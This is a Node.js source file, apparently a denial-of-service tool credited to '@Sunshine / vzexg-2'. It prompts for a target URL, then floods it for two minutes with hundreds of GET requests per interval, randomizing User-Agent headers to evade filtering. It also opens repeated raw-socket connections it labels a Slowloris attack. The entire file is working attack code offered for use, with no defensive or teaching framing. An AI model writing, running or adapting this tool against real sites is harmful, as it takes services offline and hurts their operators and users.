const http = require('http');
const https = require('https');
const net = require('net');
const readline = require('readline');

// By @Sunshine / vzexg-2 
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

rl.question('Enter the target URL: ', (url) => {
    const targetUrl = url;
    const socketConnections = 600;
    const threads = 18;
    const attackDurationSeconds = 120;

    const browsers = [
        'Chrome',
        'Firefox',
        'Safari',
        'Opera',
        'Edge',
    ];

    const operatingSystems = [
        'Windows NT 10.0',
        'Windows NT 6.3',
        'Windows NT 6.1',
        'Windows NT 6.0',
        'Macintosh; Intel Mac OS X 10_15_7',
        'Macintosh; Intel Mac OS X 10_14_6',
        'Macintosh; Intel Mac OS X 10_13_6',
        'Linux x86_64',
        'Linux i686',
        'Linux armv7l',
    ];

    function getRandomUserAgent() {
        const randomBrowser = browsers[Math.floor(Math.random() * browsers.length)];
        const randomOS = operatingSystems[Math.floor(Math.random() * operatingSystems.length)];
        const version = Math.floor(Math.random() * 100) + 1;
        return `Mozilla/5.0 (${randomOS}) AppleWebKit/537.36 (KHTML, like Gecko) ${randomBrowser}/${version}.0`;
    }

    function attack(protocol) {
        const transport = protocol === 'https' ? https : http;
        const startTime = Date.now();
        const endTime = startTime + (attackDurationSeconds * 1000);

        const timerId = setInterval(() => {
            if (Date.now() < endTime) {
                for (let i = 0; i < threads; i++) {
                    for (let j = 0; j < socketConnections / threads; j++) {
                        const options = {
                            hostname: new URL(targetUrl).hostname,
                            port: new URL(targetUrl).port || (protocol === 'https' ? 443 : 80),
                            path: new URL(targetUrl).pathname,
                            method: 'GET',
                            headers: {
                                'User-Agent': getRandomUserAgent(),
                            }
                        };

                        const req = transport.request(options, (res) => {
                            if (res.statusCode === 200) {
                                console.log("\x1b[32m[+] Attack successful!");
                            } else {
                                console.log("\x1b[31m[!] Attack failed. Status Code:", res.statusCode);
                            }
                        });

                        req.on('error', (error) => {
                            console.log("\x1b[31m[!] Attack failed. Reason:", error.message);
                        });

                        req.end();
                    }
                }
            } else {
                clearInterval(timerId);
                console.log("Attack finished. Time limit reached.");
                rl.close();
            }
        }, 100);
    }

    function slowLorisAttack() {
        const startTime = Date.now();
        const endTime = startTime + (attackDurationSeconds * 1000);
        const targetHostname = new URL(targetUrl).hostname;
        const targetPort = new URL(targetUrl).port || 80;

        const timerId = setInterval(() => {
            if (Date.now() < endTime) {
                for (let i = 0; i < threads; i++) {
                    const socket = net.connect(targetPort, targetHostname);

                    socket.on('connect', () => {
                        socket.write(`GET / HTTP/1.1\r\nHost: ${targetHostname}\r\n`);
                        socket.write(`User-Agent: ${getRandomUserAgent()}\r\n`);
                        socket.write(`Keep-Alive: timeout=1, max=1000\r\n`);
                        socket.write('\r\n');
                    });

                    socket.on('error', (error) => {
                        console.log("\x1b[31m[!] Slowloris attack failed. R:", error.message);
                    });
                }
            } else {
                clearInterval(timerId);
                console.log("Slowloris attack finished. Time limit reached.");
                rl.close();
            }
        }, 100);
    }

    function runAttacks() {
        const httpsProtocol = targetUrl.startsWith('https://');
        attack(httpsProtocol ? 'https' : 'http');
        slowLorisAttack();
    }

    runAttacks();
});